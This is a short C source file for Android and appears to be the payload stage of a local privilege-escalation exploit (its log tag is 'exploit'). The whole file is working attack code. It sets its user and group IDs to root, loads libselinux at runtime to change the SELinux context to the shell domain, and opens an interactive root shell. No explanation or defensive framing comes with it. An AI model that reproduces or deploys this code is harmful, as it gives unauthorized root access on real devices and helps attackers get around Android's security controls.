#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#include <dlfcn.h>
#include <fcntl.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

//reduce binary size
char __aeabi_unwind_cpp_pr0[0];

typedef int getcon_t(char ** con);
typedef int setcon_t(const char* con);

int main(int argc, const char **argv)
{
	LOGV("uid %s %d", argv[0], getuid());

	if (setresgid(0, 0, 0) || setresuid(0, 0, 0)) {
		LOGV("setresgid/setresuid failed");
	}

	LOGV("uid %d", getuid());

	dlerror();
#ifdef __aarch64__
	void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
	void * selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
	if (selinux) {
		void * getcon = dlsym(selinux, "getcon");
		const char *error = dlerror();
		if (error) {
			LOGV("dlsym error %s", error);
		} else {
			getcon_t * getcon_p = (getcon_t*)getcon;
			char * secontext;
			int ret = (*getcon_p)(&secontext);
			LOGV("%d %s", ret, secontext);
			void * setcon = dlsym(selinux, "setcon");
			const char *error = dlerror();
			if (error) {
				LOGV("dlsym setcon error %s", error);
			} else {
				setcon_t * setcon_p = (setcon_t*)setcon;
				ret = (*setcon_p)("u:r:shell:s0");
				ret = (*getcon_p)(&secontext);
				LOGV("context %d %s", ret, secontext);
			}
		}
		dlclose(selinux);
	} else {
		LOGV("no selinux?");
	}

	system("/system/bin/sh -i");

}